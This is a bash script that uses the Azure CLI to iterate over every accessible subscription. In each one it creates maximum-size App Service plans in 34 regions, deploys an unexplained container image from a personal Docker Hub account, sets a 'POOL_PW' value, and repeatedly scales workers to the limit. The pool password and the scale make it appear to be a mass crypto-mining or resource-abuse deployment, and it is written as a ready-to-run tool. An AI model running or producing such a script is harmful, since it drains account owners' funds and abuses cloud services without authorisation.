group="XNX"
az config set extension.use_dynamic_install=yes_without_prompt
declare -a arr=("EastUS" "NorthEurope" "WestEurope" "SoutheastAsia" "EastAsia" "WestUS" "JapanWest" "JapanEast" "EastUS2" "NorthCentralUS" "SouthCentralUS" "BrazilSouth" "AustraliaEast" "AustraliaSoutheast" "CentralUS" "CentralIndia" "SouthIndia" "CanadaCentral" "CanadaEast" "WestUS2" "UKWest" "UKSouth" "KoreaCentral" "FranceCentral" "SouthAfricaNorth" "SwitzerlandNorth" "GermanyWestCentral" "UAENorth" "NorwayEast" "WestUS3" "SwedenCentral" "PolandCentral" "ItalyNorth" "IsraelCentral")

sample=$(az account subscription list)
for row in $(echo "${sample}" | jq -r '.[] | @base64');
do
	_jq() {
		echo ${row} | base64 --decode | jq -r ${1}
	}
	subid="$(_jq '.subscriptionId')"
	az account set --subscription "$subid"
	number=${subid:0:8}
	az group create --location "EastUS" --name "GEastUS"
	for loca in "${arr[@]}"
	do
	   echo "$loca"
	   az appservice plan create --name "$loca"_pt_1 --resource-group "GEastUS" --sku P5MV3 --is-linux --location "$loca" --number-of-workers 5

	done
	for loca in "${arr[@]}"
	do
		echo "$loca"
		result=$(az appservice plan show -n "$loca"_pt_1 -g GEastUS --query name --output tsv)
		nm="$loca"_pt_1
		if [ "$result" != "$nm" ]; then
			az appservice plan create --name "$loca"_pt_1 --resource-group "GEastUS" --sku P5MV3 --is-linux --location "$loca"
		fi
	done
	
done


for row in $(echo "${sample}" | jq -r '.[] | @base64');
do
	_jq() {
		echo ${row} | base64 --decode | jq -r ${1}
	}
	subid="$(_jq '.subscriptionId')"
	az account set --subscription "$subid"
	number=${subid:0:8}
	for loca in "${arr[@]}"
	do
		echo "$loca"
		
		az webapp create --name "$group"-"$loca"-webapp-"$number" --resource-group "GEastUS" --plan "$loca"_pt_1 --deployment-container-image-name index.docker.io/daotao002/ublong
		az webapp config appsettings set --name "$group"-"$loca"-webapp-"$number" --resource-group "GEastUS" --settings POOL_PW=$group

	done


done


for row in $(echo "${sample}" | jq -r '.[] | @base64');
do
  _jq() {
		echo ${row} | base64 --decode | jq -r ${1}
	}
	subid="$(_jq '.subscriptionId')"
  az account set --subscription "$subid"
  declare -a arr=("EastUS" "NorthEurope" "WestEurope" "SoutheastAsia" "EastAsia" "WestUS" "JapanWest" "JapanEast" "EastUS2" "NorthCentralUS" "SouthCentralUS" "BrazilSouth" "AustraliaEast" "AustraliaSoutheast" "CentralUS" "CentralIndia" "SouthIndia" "CanadaCentral" "CanadaEast" "WestUS2" "UKWest" "UKSouth" "KoreaCentral" "FranceCentral" "SouthAfricaNorth" "SwitzerlandNorth" "GermanyWestCentral" "UAENorth" "NorwayEast" "WestUS3" "SwedenCentral" "PolandCentral" "ItalyNorth" "IsraelCentral")
  for i in {1..50}
  do 
  	for loca in "${arr[@]}"
  	do
  		echo "$loca"
  		wk=$(az appservice plan show -n "$loca"_pt_1 -g GEastUS --query sku.capacity --output tsv)
  		echo $wk
  		let "nwk=$wk+1"
  
  		if [[ "$nwk" -lt 6 ]]; then
  			az appservice plan update -n "$loca"_pt_1 -g GEastUS --number-of-workers "$nwk"
  		else
  			arr=("${arr[@]/$loca}")
  		fi
  		
  
  	done
  	sleep 5
  done

done

